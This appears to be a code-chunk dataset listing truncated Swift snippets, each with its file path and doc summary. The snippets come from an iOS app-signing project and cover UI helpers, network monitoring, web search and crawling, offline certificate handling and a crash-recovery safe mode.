2028,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift","/ Generate random bytes for cryptographic operations / - Parameter length: Number of random bytes to generate / - Returns: Data containing random bytes","func generateRandomBytes(length: Int) -> Data {
var randomBytes = [UInt8](repeating: 0, count: length)
let status = SecRandomCopyBytes(kSecRandomDefault, length, &randomBytes)

if status == errSecSuccess {"
2029,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/CryptoHelper.swift","/ Calculate CRC32 checksum for data / - Parameter data: The data to calculate checksum for / - Returns: CRC32 checksum as UInt32","func crc32(of data: Data) -> UInt32 {
// Initialize with all bits set
var checksum: UInt32 = 0xFFFFFFFF

// Process each byte
data.forEach { byte in"
2030,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","MARK: - UIView Extensions for AutoLayout","extension UIView {
/// Set up constraints with native AutoLayout
/// - Parameter constraints: Array of constraints to activate
func setupConstraints(_ constraints: [NSLayoutConstraint]) {"
2031,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Set up constraints with native AutoLayout / - Parameter constraints: Array of constraints to activate","func setupConstraints(_ constraints: [NSLayoutConstraint]) {
translatesAutoresizingMaskIntoConstraints = false
NSLayoutConstraint.activate(constraints)
}

/// Set up constraints with a closure
/// - Parameter setup: Closure that returns constraints to activate
func setupConstraints(_ setup: (UIView) -> [NSLayoutConstraint]) {"
2032,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Set up constraints with a closure / - Parameter setup: Closure that returns constraints to activate","func setupConstraints(_ setup: (UIView) -> [NSLayoutConstraint]) {
translatesAutoresizingMaskIntoConstraints = false
NSLayoutConstraint.activate(setup(self))
}

/// Update existing constraints
/// - Parameter update: Closure that performs constraint updates
func updateConstraints(_ update: () -> Void) {"
2033,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Update existing constraints / - Parameter update: Closure that performs constraint updates","func updateConstraints(_ update: () -> Void) {
update()
layoutIfNeeded()
}

/// Create a stack view with standard configuration
/// - Parameters:
///   - axis: Axis for the stack view
///   - spacing: Spacing between items
///   - views: Views to add to the stack"
2034,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Create a stack view with standard configuration / - Parameters: /   - axis: Axis for the stack view /   - spacing: Spacing between items /   - views: Views to add to the stack /   - insets: Insets to apply to the stack view / - Returns: Configured UIStackView","static func createStack(axis: NSLayoutConstraint.Axis,
spacing: CGFloat = 8,
views: [UIView],
insets: UIEdgeInsets = .zero) -> UIStackView
{"
2035,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","MARK: - Internal Animation Helper","class InternalAnimationHelper {
/// Add an animated icon to a view (replacement for Lottie)
/// - Parameters:
///   - systemName: SF Symbol name
///   - view: Parent view to add the animation to
///   - loopMode: Animation loop mode (continuous, once, etc.)
///   - size: Size for the animation view
/// - Returns: The configured UIImageView
static func addAnimation(systemName: String, to view: UIView,
loopMode _: UIView.AnimationRepeatCount = .infinity,"
2036,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Add an animated icon to a view (replacement for Lottie) / - Parameters: /   - systemName: SF Symbol name /   - view: Parent view to add the animation to /   - loopMode: Animation loop mode (continuous, once, etc.) /   - size: Size for the animation view / - Returns: The configured UIImageView","static func addAnimation(systemName: String, to view: UIView,
loopMode _: UIView.AnimationRepeatCount = .infinity,
size: CGSize? = nil) -> UIImageView
{"
2037,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Show an animated loading indicator / - Parameters: /   - view: View to add the loader to /   - message: Optional message to display / - Returns: Container view with the animation that can be removed later","static func showLoader(in view: UIView, message: String? = nil) -> UIView {
// Create container for the loader
let container = UIView()
container.backgroundColor = UIColor.black.withAlphaComponent(0.3)
container.translatesAutoresizingMaskIntoConstraints = false
view.addSubview(container)

// Set constraints for full screen
NSLayoutConstraint.activate([
container.topAnchor.constraint(equalTo: view.topAnchor),"
2038,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Hide the loader / - Parameter container: Container view returned by showLoader","static func hideLoader(_ container: UIView) {
UIView.animate(withDuration: 0.3, animations: {"
2039,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","MARK: - Internal UI Components","class InternalUIComponents {
/// Create a beautifully styled button with gradient
/// - Parameters:
///   - title: Button title
///   - colors: Gradient colors (default blue gradient)
///   - cornerRadius: Corner radius (default 12)
///   - fontSize: Font size (default 16)
/// - Returns: Configured button
static func createGradientButton(title: String,
colors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],"
2040,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Create a beautifully styled button with gradient / - Parameters: /   - title: Button title /   - colors: Gradient colors (default blue gradient) /   - cornerRadius: Corner radius (default 12) /   - fontSize: Font size (default 16) / - Returns: Configured button","static func createGradientButton(title: String,
colors: [UIColor] = [.systemBlue, UIColor(red: 0, green: 0.5, blue: 1, alpha: 1)],
cornerRadius: CGFloat = 12,
fontSize: CGFloat = 16) -> UIButton
{"
2041,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Create a card view with shadow / - Parameters: /   - backgroundColor: Card background color /   - cornerRadius: Corner radius / - Returns: Configured card view","static func createCardView(backgroundColor: UIColor = .systemBackground,
cornerRadius: CGFloat = 16) -> UIView
{"
2042,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Create a beautiful text field with floating label / - Parameters: /   - placeholder: Placeholder text /   - backgroundColor: Background color /   - borderColor: Border color / - Returns: Configured text field with container","static func createFloatingTextField(placeholder: String,
backgroundColor: UIColor = .systemBackground,
borderColor: UIColor = .systemGray4) -> UIView
{"
2043,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","/ Extension to define animation repeat options","extension UIView {
enum AnimationRepeatCount: Equatable {"
2044,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Helpers/UIHelpers.swift","enum AnimationRepeatCount - implements functionality related to animation repeat count","enum AnimationRepeatCount: Equatable {
case once
case finite(count: Int)
case infinity

var floatValue: Float {"
2045,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","/ Network connectivity status","enum ConnectionType {
case wifi
case cellular
case ethernet
case unknown
}

/// Class for monitoring network connectivity status
class NetworkMonitor {"
2046,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","/ Class for monitoring network connectivity status","class NetworkMonitor {
// MARK: - Properties

/// Singleton instance
static let shared = NetworkMonitor()

/// Network path monitor
private let monitor = NWPathMonitor()

/// Monitor queue"
2047,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","MARK: - Public Methods / Start monitoring network status","func startMonitoring() {
monitor.pathUpdateHandler = { [weak self] path in"
2048,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","/ Stop monitoring network status","func stopMonitoring() {
monitor.cancel()
}

/// Check if the current connection is expensive (cellular)
var isExpensiveConnection: Bool {"
2049,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","MARK: - Private Methods / Update the current connection type based on the network path","private func updateConnectionType(_ path: NWPath) {
if path.usesInterfaceType(.wifi) {"
2050,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/NetworkMonitor.swift","/ Check if the device has been offline for a significant period","func hasBeenOfflineForExtendedPeriod() -> Bool {
guard !isConnected else { return false }"
2051,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","class SourceRefreshOperation - implements functionality related to source refresh operation","@objc class SourceRefreshOperation: Operation, @unchecked Sendable {
private let queue = DispatchQueue(label: ""kh.crysalis.backdoor.sourcerefresh"", qos: .userInitiated)
private let isDebugMode: Bool = {"
2052,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","Function main - implements main functionality","override func main() {
guard !isCancelled else { return }"
2053,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","Function checkForUpdates - implements checkforupdates functionality","private func checkForUpdates(with sourceData: [(data: SourcesData, url: URL)]) {
let coreDataQueue = DispatchQueue(label: ""kh.crysalis.backdoor.coredata"", qos: .userInitiated)

coreDataQueue.sync {"
2054,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","Function cleanVersion - implements cleanversion functionality","private func cleanVersion(_ version: String) -> String {
// find first occurrence of version pattern X.Y.Z
let pattern = ""\\d+(\\.\\d+)+""
if let range = version.range(of: pattern, options: .regularExpression) {"
2055,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","Function compareVersions - implements compareversions functionality","private func compareVersions(_ v1: String, _ v2: String) -> Int {
let cleanV1 = cleanVersion(v1)
let cleanV2 = cleanVersion(v2)

let v1Components = cleanV1.split(separator: ""."").compactMap { Int($0) }"
2056,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/SourceRefreshOperation.swift","Function createMockSource - creates mocksource","func createMockSource(completion: @escaping (SourcesData?) -> Void) {
let signedApps = CoreDataManager.shared.getDatedSignedApps()
Debug.shared.log(
message: ""Debug mode: Found \(signedApps.count) signed app\(signedApps.count == 1 ? """" : ""s"")"",
type: .info
)

if let firstApp = signedApps.first {"
2057,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Data Structures / Source type for categorizing search results","enum SourceType {
case web
case academic
case news
case social
case database
case unknown
}

/// Search depth levels for different search intensities"
2058,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Search depth levels for different search intensities","enum SearchDepth: Int {
case standard = 0 // Basic search
case enhanced = 1 // Follow top links
case deep = 2 // Follow multiple links with recursive crawling
case specialized = 3 // Domain-specific searches (academic, news, etc.)
}

/// Basic search result model
struct WebSearchResult {"
2059,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Basic search result model","struct WebSearchResult {
let title: String
let description: String
let url: URL
var sourceType: SourceType = .web
}

/// Enhanced search result with additional metadata
struct DeepSearchResult {"
2060,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Enhanced search result with additional metadata","struct DeepSearchResult {
var title: String = """"
var description: String = """"
var url: URL?
var keywords: [String] = []
var sentiment: Double = 0.0
var relatedContent: [String: String] = [:]
var sourceType: SourceType = .web
var contentSummary: String = """"
var extractedDate: Date?"
2061,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Structure to hold extracted page data","struct PageData {
var content: String
var keywords: [String]
var sentiment: Double = 0.0
var relatedContent: [String: String] = [:]
var entities: [String: String] = [:]
var links: [URL] = []
var imageURLs: [URL] = []
var extractedDate: Date?
}"
2062,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Search cache entry","struct SearchCacheEntry {
let results: [DeepSearchResult]
let timestamp: Date
let query: String
let depth: SearchDepth
}

/// Possible search errors
enum SearchError: Error {"
2063,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Possible search errors","enum SearchError: Error {
case invalidQuery
case networkError(Error)
case parsingError
case emptyResults
case rateLimitExceeded
case accessDenied
case timeout
case crawlFailed
case unsupportedSourceType"
2064,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Main Manager Class / Enhanced web search manager with deep search capabilities","class WebSearchManager {
// Singleton instance
static let shared = WebSearchManager()

// Configuration properties
private let maxConcurrentRequests = 5
private let requestTimeout: TimeInterval = 10
private let maxCacheAgeMins: Double = 30
private let maxSearchDepth = 3
private let maxResultsPerSearch = 20"
2065,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Public API / Performs a standard web search for the given query / - Parameters: /   - query: The search query string /   - completion: Callback with search results or error","func performSearch(query: String, completion: @escaping (Result<[WebSearchResult], Error>) -> Void) {
Debug.shared.log(message: ""Performing standard web search for: \(query)"", type: .info)

// Check privacy settings before proceeding
guard privacyManager.isSearchEnabled else {"
2066,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Performs a deep search with configurable depth and specialized sources / - Parameters: /   - query: The search query string /   - depth: How deep to search (affects crawling depth and source diversity) /   - sourceTypes: What types of sources to include /   - completion: Callback with enhanced search results or error","func performDeepSearch(
query: String,
depth: SearchDepth = .enhanced,
sourceTypes: [SourceType] = [.web, .news, .academic],
completion: @escaping (Result<[DeepSearchResult], Error>) -> Void
) {"
2067,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Cancel an active search session","func cancelAllSearches() {
sessionQueue.sync {"
2068,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Format deep search results as a readable string","func formatDeepSearchResults(_ results: [DeepSearchResult]) -> String {
var formattedResults = """"

for (index, result) in results.prefix(5).enumerated() {"
2069,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Format standard search results as a readable string / This method is needed by CustomAIService+DeepSearch","func formatSearchResults(_ results: [WebSearchResult]) -> String {
var formattedResults = """"

for (index, result) in results.prefix(5).enumerated() {"
2070,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Search Processing / Process standard search results from raw data","private func processSearchResults(
data: Data,
query: String,
completion: @escaping (Result<[WebSearchResult], Error>) -> Void
) {"
2071,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Extract structured search results from DuckDuckGo response","private func extractSearchResults(from json: [String: Any]) -> [WebSearchResult]? {
var results: [WebSearchResult] = []

// Extract the AbstractText if available (featured snippet)
if let abstractText = json[""AbstractText""] as? String,
!abstractText.isEmpty,
let abstractURL = json[""AbstractURL""] as? String,
let url = URL(string: abstractURL)
{"
2072,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Detect the source type based on URL and title","private func detectSourceType(url: URL, title _: String) -> SourceType {
let domain = url.host?.lowercased() ?? """"
let path = url.path.lowercased()

// Academic sources
if domain.contains(""scholar.google"") ||
domain.contains(""sciencedirect"") ||
domain.contains(""researchgate"") ||
domain.contains(""academia.edu"") ||
domain.contains(""ieee.org"") ||"
2073,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Deep Search / Web crawling function to follow links for deeper context","private func crawlPage(url: URL, depth: Int, completion: @escaping (PageData?) -> Void) {
// Skip if depth is 0 or privacy disallows crawling
guard depth > 0, privacyManager.isCrawlingEnabled else {"
2074,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Perform specialized search using specific APIs based on source type","private func performSpecializedSearch(
query: String,
sourceTypes: [SourceType],
completion: @escaping ([DeepSearchResult]) -> Void
) {"
2075,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Search academic sources","private func searchAcademic(query: String, completion: @escaping ([DeepSearchResult]) -> Void) {
// This would normally use a specialized API like Semantic Scholar
// For now, use a simplified implementation

guard let encodedQuery = query.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) else {"
2076,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Search news sources","private func searchNews(query: String, completion: @escaping ([DeepSearchResult]) -> Void) {
// This would normally use a specialized API like News API
// For now, use a simplified implementation

guard let encodedQuery = query.addingPercentEncoding(withAllowedCharacters: .urlQueryAllowed) else {"
2077,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Content Extraction / Extract the main content from HTML","private func extractMainContent(from html: String) -> String {
// Remove scripts, styles, and headers
let cleanedHtml = html
.replacingOccurrences(of: ""<script[^>]*>.*?</script>"", with: """", options: .regularExpression)
.replacingOccurrences(of: ""<style[^>]*>.*?</style>"", with: """", options: .regularExpression)
.replacingOccurrences(of: ""<header[^>]*>.*?</header>"", with: """", options: .regularExpression)
.replacingOccurrences(of: ""<nav[^>]*>.*?</nav>"", with: """", options: .regularExpression)
.replacingOccurrences(of: ""<footer[^>]*>.*?</footer>"", with: """", options: .regularExpression)

// Extract text from main content tags"
2078,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Extract links from HTML","private func extractLinks(from html: String, baseURL: URL) -> [URL] {
var links: [URL] = []
let pattern = ""<a[^>]+href=[\""']([^\""']+)[\""'][^>]*>""

do {"
2079,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Extract images from HTML","private func extractImages(from html: String, baseURL: URL) -> [URL] {
var images: [URL] = []
let pattern = ""<img[^>]+src=[\""']([^\""']+)[\""'][^>]*>""

do {"
2080,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Extract date from HTML","private func extractDate(from html: String) -> Date? {
// Try common date meta tags
let patterns = [
""<meta[^>]+property=[\""']article:published_time[\""'][^>]+content=[\""']([^\""']+)[\""']"",
""<meta[^>]+name=[\""']publication_date[\""'][^>]+content=[\""']([^\""']+)[\""']"",
""<time[^>]+datetime=[\""']([^\""']+)[\""']"",
""<span[^>]+class=[\""']date[\""'][^>]*>([^<]+)</span>"",
]

for pattern in patterns {"
2081,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Extract keywords from text","private func extractKeywords(from text: String) -> [String] {
guard !text.isEmpty else { return [] }"
2082,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Check if a word is a common stop word","private func isStopWord(_ word: String) -> Bool {
let stopWords = [""the"", ""and"", ""or"", ""but"", ""for"", ""nor"", ""on"", ""at"", ""to"", ""from"", ""by"", ""with"",
""about"", ""against"", ""between"", ""into"", ""through"", ""during"", ""before"", ""after"",
""above"", ""below"", ""under"", ""over"", ""again"", ""further"", ""then"", ""once"", ""here"",
""there"", ""when"", ""where"", ""why"", ""how"", ""all"", ""any"", ""both"", ""each"", ""few"",
""more"", ""most"", ""other"", ""some"", ""such"", ""only"", ""own"", ""same"", ""than"", ""too"",
""very"", ""can"", ""will"", ""just"", ""should"", ""now""]

return stopWords.contains(word)
}"
2083,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Generate a summary from text","private func generateSummary(from text: String) -> String {
guard !text.isEmpty else { return """" }"
2084,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Relevance and Ranking / Calculate relevance score for a search result","private func calculateRelevanceScore(query: String, result: DeepSearchResult, pageData: PageData) -> Double {
var score = 0.0

// Base score from initial result position
score += max(0.1, result.confidence)

// Split query into terms
let queryTerms = query.lowercased().components(separatedBy: .whitespacesAndNewlines)
.filter { !$0.isEmpty && !self.isStopWord($0) }"
2085,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Enhance metadata for search results","private func enhanceResultsMetadata(deepResults: inout [DeepSearchResult], query: String) {
// Extract potential entities from the query
let queryEntities = NaturalLanguageHelper.shared.extractEntities(from: query)

for i in 0 ..< deepResults.count {"
2086,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Caching / Get cached search results if available","private func getCachedResults(for key: String) -> [DeepSearchResult]? {
var results: [DeepSearchResult]?

cacheQueue.sync {"
2087,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Cache deep search results","private func cacheDeepSearchResults(
_ results: [DeepSearchResult],
for key: String,
query: String,
depth: SearchDepth
) {"
2088,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Clean expired entries from cache","private func cleanCache() {
cacheQueue.sync {"
2089,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Private Methods - Learning / Log search data for AI learning","private func logSearchDataForLearning(query: String, results: [DeepSearchResult], depth: SearchDepth) {
// Only log if learning is enabled
guard AILearningManager.shared.isLearningEnabled else {"
2090,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Privacy Management / Manages privacy settings for search functionality","class SearchPrivacyManager {
// Privacy setting keys
private let searchEnabledKey = ""privacy_search_enabled""
private let deepSearchEnabledKey = ""privacy_deep_search_enabled""
private let crawlingEnabledKey = ""privacy_crawling_enabled""
private let searchCachingEnabledKey = ""privacy_search_caching_enabled""
private let trackedDomainsKey = ""privacy_tracked_domains""

/// Check if general search is enabled
var isSearchEnabled: Bool {"
2091,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Update search privacy settings","func updateSettings(
searchEnabled: Bool? = nil,
deepSearchEnabled: Bool? = nil,
crawlingEnabled: Bool? = nil,
cachingEnabled: Bool? = nil
) {"
2092,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Add a domain to privacy tracking exclusion list","func excludeDomain(_ domain: String) {
var domains = UserDefaults.standard.stringArray(forKey: trackedDomainsKey) ?? []
if !domains.contains(domain) {"
2093,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Remove a domain from privacy tracking exclusion list","func includeDomain(_ domain: String) {
var domains = UserDefaults.standard.stringArray(forKey: trackedDomainsKey) ?? []
domains.removeAll { $0 == domain }"
2094,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","/ Check if a domain should be tracked","func shouldTrackDomain(_ domain: String) -> Bool {
let excludedDomains = UserDefaults.standard.stringArray(forKey: trackedDomainsKey) ?? []
return !excludedDomains.contains(domain)
}
}

// MARK: - Helper Extensions

extension DateFormatter {"
2095,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","MARK: - Helper Extensions","extension DateFormatter {
@discardableResult
func apply(_ configuration: (DateFormatter) -> Void) -> DateFormatter {"
2096,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Network/WebSearchManager.swift","Function apply - implements apply functionality","func apply(_ configuration: (DateFormatter) -> Void) -> DateFormatter {
configuration(self)
return self
}
}
"
2097,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Manager for handling offline app signing functionality","class OfflineSigningManager {
// MARK: - Properties

/// Singleton instance
static let shared = OfflineSigningManager()

/// Flag indicating if offline signing is enabled
private(set) var isOfflineSigningEnabled = true

/// Flag indicating if local certificates have been validated"
2098,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","MARK: - Initialization / Validate local certificates for offline signing / Public method to allow validation from outside the class","func validateCertificates() {
// Check if certificates exist at the expected locations
let fileManager = FileManager.default
let certExists = fileManager.fileExists(atPath: serverCertPath.path)
let keyExists = fileManager.fileExists(atPath: serverKeyPath.path)

// Update validation state
localCertificatesValidated = certExists && keyExists
lastCertificateValidationTime = Date()
"
2099,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Toggle forced offline mode","func toggleForceOfflineMode(_ force: Bool) {
forceOfflineMode = force

// Log the mode change
Debug.shared.log(
message: ""Offline signing mode \(force ? ""forced"" : ""automatic"")"",
type: .info
)

// Post notification for UI updates"
2100,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Enable/disable offline signing","func setOfflineSigningEnabled(_ enabled: Bool) {
isOfflineSigningEnabled = enabled

// Log the setting change
Debug.shared.log(
message: ""Offline signing \(enabled ? ""enabled"" : ""disabled"")"",
type: .info
)

// Update user defaults"
2101,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Show offline mode indicator on view","func showOfflineModeIndicator(on view: UIView) {
// Only show indicator if offline mode is active
guard isOfflineModeActive else { return }"
2102,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Hide offline mode indicator from view","func hideOfflineModeIndicator(from view: UIView) {
if let indicator = view.viewWithTag(8675) {"
2103,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Import local certificates","func importLocalCertificates(certData: Data, keyData: Data, completion: @escaping (Bool, Error?) -> Void) {
do {"
2104,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Get certificates for offline signing","func getOfflineSigningCertificates() -> (cert: URL?, key: URL?) {
guard localCertificatesValidated else {"
2105,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","Function validateLocalCertificates - implements validatelocalcertificates functionality","private func validateLocalCertificates() -> Bool {
// Prevent frequent revalidation
if let lastValidation = lastCertificateValidationTime,
Date().timeIntervalSince(lastValidation) < 60
{ // Only validate once per minute"
2106,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Create offline mode indicator","private func createOfflineIndicator() -> UIView {
let container = UIView()
container.backgroundColor = UIColor.systemRed.withAlphaComponent(0.8)
container.layer.cornerRadius = 14

// Create label
let label = UILabel()
label.text = ""OFFLINE MODE""
label.font = UIFont.systemFont(ofSize: 12, weight: .bold)
label.textColor = .white"
2107,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Animate offline indicator","private func animateOfflineIndicator(_ indicator: UIView) {
// Add subtle pulse animation
UIView.animate(withDuration: 1.0, delay: 0, options: [.autoreverse, .repeat, .curveEaseInOut], animations: {"
2108,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Handle network status changes","@objc private func networkStatusChanged(_ notification: Notification) {
guard let isConnected = notification.userInfo?[""isConnected""] as? Bool else { return }"
2109,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","MARK: - Extension for UIViewController","extension UIViewController {
/// Update UI for offline mode
func updateForOfflineMode() {"
2110,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/Security/OfflineSigningManager.swift","/ Update UI for offline mode","func updateForOfflineMode() {
let offlineManager = OfflineSigningManager.shared

if offlineManager.isOfflineModeActive {"
2111,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift","/ SafeModeLauncher - Detects and recovers from repeated app crashes by providing a minimal safe mode","class SafeModeLauncher {
static let shared = SafeModeLauncher()

// Keys for UserDefaults
private let launchAttemptsKey = ""launchAttempts""
private let safeModeFlagKey = ""inSafeMode""
private let maxLaunchAttempts = 3
private var launchSuccessMarked = false

/// Whether the app is currently in safe mode"
2112,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Utilities/SafeModeLauncher.swift","/ Record a launch attempt and enter safe mode if there have been too many failures","func recordLaunchAttempt() {
let launchAttempts = UserDefaults.standard.integer(forKey: launchAttemptsKey) + 1
UserDefaults.standard.set(launchAttempts, forKey: launchAttemptsKey)
UserDefaults.standard.synchronize()

if launchAttempts >= maxLaunchAttempts {"
